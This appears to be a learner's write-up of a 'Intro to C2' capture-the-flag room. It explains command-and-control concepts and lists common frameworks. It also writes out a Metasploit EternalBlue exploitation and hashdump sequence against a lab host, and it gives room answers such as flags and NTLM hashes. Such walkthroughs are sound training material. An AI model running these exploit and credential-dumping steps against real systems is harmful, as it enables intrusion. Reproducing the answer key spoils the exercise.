# Intro to C2 - Medium

1. [Command and Control Framework Structure](#command-and-control-framework-structure)
2. [Common C2 Frameworks](#common-c2-frameworks)
3. [C2 Operation Basics](#c2-operation-basics)
4. [Command, Control and Conquer](#command-control-and-conquer)
5. [Advanced C2 Setups](#advanced-c2-setups)

## Command and Control Framework Structure

* Command and Control (C2) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. They help in managing compromised devices and aid in lateral movement.

* C2 Structure:

  * C2 Server - This serves as a hub for C2 agents to call back to.

  * Agents/Payloads - Program generated by the C2 framework that calls back to a listener on a C2 server; most C2 frameworks implement pseudo commands.

  * Listeners - Application running on the C2 server that waits for a callback over a specific port/protocol.

  * Beacon - Process of a C2 agent calling back to the listener running on a C2 server.

* Obfuscating Agent Callbacks:

  * Sleep timers - rate at which a device beacons out to a C2 server.

  * Jitter - adds variation to the sleep timer in order to make the activity look like an average user's.

* Payload Types:

  * Stageless Payloads:
  
    * They contain the full C2 agent and will call back to the C2 server and begin beaconing immediately.

    * Steps for establishing C2 beaconing with a stageless payload:

        1. Victim downloads and executes the Dropper
        2. The beaconing to the C2 server begins

  * Staged Payloads:

    * They require a callback to the C2 server to download additional parts of the C2 agent; these payloads are also called 'droppers'.

    * Preferred over stageless payloads due to easier obfuscation process.

    * Steps for establishing C2 beaconing with a staged payload:

        1. Victim downloads and executes the Dropper
        2. Dropper calls back to the C2 server for Stage 2
        3. C2 server sends Stage 2 back to the Victim Workstation
        4. Stage 2 is loaded into memory on the Victim Workstation
        5. C2 beaconing starts

* Modules:

  * Post Exploitation Modules - used after the initial point of compromise.

  * Pivoting Modules - to access restricted network segments within the C2 framework.

* Placing infrastructure in plain view:

  * Domain Fronting - Red Teamers utilize a known host (like Cloudflare) and make it appear that a workstation/server is communicating with a trusted IP address.

  * C2 Profiles - Proxy features allow a user to control specific elements of the incoming HTTP request.

```markdown
1. What is the component's name that lives on the victim machine that calls back to the C2 server? - Agent

2. What is the beaconing option that introduces a random delay value to the sleep timer? - Jitter

3. What is the term for the first portion of a Staged payload? - Dropper

4. What is the name of the communication method that can potentially allow access to a restricted network segment that communicates via TCP ports 139 and 445? - SMB Beacon
```

## Common C2 Frameworks

* Free C2 frameworks:

  * Metasploit
  
  * Armitage
  
  * Powershell Empire / Starkiller

  * Covenant

  * Sliver

* Paid C2 frameworks:

  * Cobalt Strike

  * Brute Ratel

## C2 Operation Basics

```markdown
1. Which listener should you choose if you have a device that cannot easily access the internet? - DNS

2. Which listener should you choose if you're accessing a restricted network segment? - SMB

3. Which listener should you choose if you are dealing with a Firewall that does protocol inspection? - HTTPS
```

## Command, Control and Conquer

```shell
nmap -T4 -A 10.10.252.35

msfconsole

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS 10.10.252.35

show options

show targets

exploit

#gives Meterpreter session

help
#view commands

hashdump
#dumps hashes
```

```markdown
After the nmap scan, we know that the machine is running Windows 7 Home Basic 7600.

This means we can attempt the EternalBlue exploit using Metasploit.

After configuring all options and exploiting, we get a Meterpreter session, with admin access.

User flag can be found in Ted's Desktop

Root flag can be found in Administrator's Desktop.

hashdump command can be used to get hashes.
```

```markdown
1. What flag can be found after gaining Administrative access to the PC? - THM{bd6ea6c871dced619876321081132744}

2. What is the Administrator's NTLM hash? - c156d5d108721c5626a6a054d6e0943c

3. What flag can be found after gaining access to Ted's user account? - THM{217fa45e35f8353ffd04cfc0be28e760}

4. What is Ted's NTLM hash? - 2e2618f266da8867e5664425c1309a5c
```

## Advanced C2 Setups

```markdown
1. What setting name that allows you to modify the User Agent field in a Meterpreter payload? - HttpUserAgent

2. What setting name that allows you to modify the Host header in a Meterpreter payload? - HttpHostHeader
```